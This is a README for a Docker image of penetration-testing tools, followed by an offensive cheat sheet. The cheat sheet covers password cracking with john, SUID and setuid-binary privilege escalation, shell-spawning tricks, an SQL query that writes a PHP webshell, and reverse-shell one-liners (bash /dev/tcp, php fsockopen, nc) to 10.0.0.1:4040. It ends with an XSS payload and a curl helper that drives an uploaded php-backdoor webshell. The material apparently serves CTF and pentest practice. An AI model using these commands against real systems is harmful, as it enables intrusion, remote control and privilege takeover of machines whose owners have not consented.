# hacking tools

## Build from DockerHub
[DockerHub: manigley/hacking-tools](https://hub.docker.com/repository/docker/manigley/hacking-tools)

      docker run -d \
            -p 4040-4080:4040-4080 \
            -v hacking-tools-share:/home/hacker/share:rw \
            --name hacking-tools \
            manigley/hacking-tools

      docker exec -it hacking-tools zsh


## Build from source

> - **build the image**  
>   `git clone https://github.com/roymanigley/docker-hacking-tools.git`  
>   `cd docker-hacking-tools` 
>
> - **build the image**  
>   `docker-compose build` 
>
> - **start the image**  
>   `docker-compose up -d` 
>
> - **open the shell**  
>   `docker-compose exec hacking-tools zsh`  
> the **default password** for the user hacker is **hacker**  
> 
> - **shared folders**  
>   `./hacking-tools-share → /home/hacker/share`  

## push a new version to dockerhub

      export NEW_VERSION=1.0.0
      docker-compose build \
            && docker tag docker-hacking-tools_hacking-tools:latest manigley/hacking-tools:$NEW_VERSION \
            && docker push manigley/hacking-tools:$NEW_VERSION

## Credentials

| Username    | Password |
| ----------- | -------- |
| hacker      | hacker   |

## Tools

| Name        | Installation Path             |
| ----------- | ----------------------------- |
| wordlists   | /usr/share/wordlists          |
| webshells   | /usr/share/webshells          |
| exploit-db  | /usr/share/exploit-database   |
| john        | /usr/src/john                 |
| openvpn     | /usr/sbin/openvpn             |
| nmap        | /usr/bin/nmap                 |
| dirb        | /usr/bin/dirb                 |
| sqlmap      | /usr/share/sqlmap             |
| hashcat     | /usr/bin/hashcat              |
| hydra       | /usr/bin/hydra                |
| netcat      | /bin/nc.openbsd               |
| enum4linux  | /usr/share/enum4linux         |
| PEASS-ng    | /usr/share//PEASS-ng          |
| metasploit  | /usr/bin/msfconsole           |
| msfvenom    | /usr/bin/msfvenom             |

---

## Helpers

### Links

- https://www.revshells.com/
- https://gchq.github.io/CyberChef
- https://gtfobins.github.io/
- https://pentestmonkey.net/
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://phonebook.cz/

### SMB

      smbclient -L \\\\$TARGET_HOST
      smbclient \\\\$TARGET_HOST\\ADMIN$ -U Anonymous

      enum4linux -u $TARGET_HOST
      enum4linux -s $TARGET_HOST

### BruteForce

      /usr/src/john/run/unshadow passwd.txt shadow.txt > unshadowed.txt
      /usr/src/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
      /usr/src/john/run/john --show unshadowed.txt

      python3 /usr/src/john/run/ssh2john.py id_rsa > id_rsa.hash
      /usr/src/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
      /usr/src/john/run/john --show id_rsa.hash

      python3 /usr/src/john/run/gpg2john asdfgpg.priv > gpg.hash
      /usr/src/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
      /usr/src/john/run/john --show gpg.hash

### Privilege Escalation

-     uname -a; lsb_release -a; w; id;
-     find / -perm -u=s -type f 2>/dev/null
-     chmod u+s /bin/bash # as root
      /bin/bash -p # as user

-     vim /tmp/ecalate.c

      #include <unistd.h>

      int main() {
        setgid(0);
        setuid(0);
        execl("/bin/bash", "bash", (char *)NULL);
        return 0;
      }

      gcc /tmp/ecalate.c -o /tmp/ecalate
      chown root:root /tmp/ecalate
      chmod u+s /tmp/ecalate && chmod g+s /tmp/ecalate

### Shell spawning
-     nmap --interactive
      !sh
-     zip xy.zip -T -TT 'bash #'
-     python -c 'import pty;pty.spawn("/bin/bash")'
-     python -c 'import os; os.system("/bin/sh")'


> stable shell (allow CTRL+c, autocomplete etc.)  
```
CTRL+z
stty raw -echo
fg
reset
```

### RSH
> more in [RSH.md](RSH.md)

-     SELECT '<?php system($_GET["cmd"]); ?>' INTO dumpfile ‘/tmp/somefile’;

-     bash -i >& /dev/tcp/10.0.0.1/4040 0>&1

-     php -r '$sock=fsockopen("10.0.0.1",4040);exec("/bin/sh -i <&3 >&3 2>&3");'

-     nc 10.0.0.1 4040 | /bin/sh | nc 10.0.0.1 4242

### XSS

-     <img src="!" onerror="alert(1);">

### Scripts 
-     type nc; type netcat; type python; type python2; type python3 


      function myrsh {
            declare param=$(omz_urlencode "$1")
            curl "http://10.10.48.94/uploads/php-backdoor.phtml?cmd=$param"
      }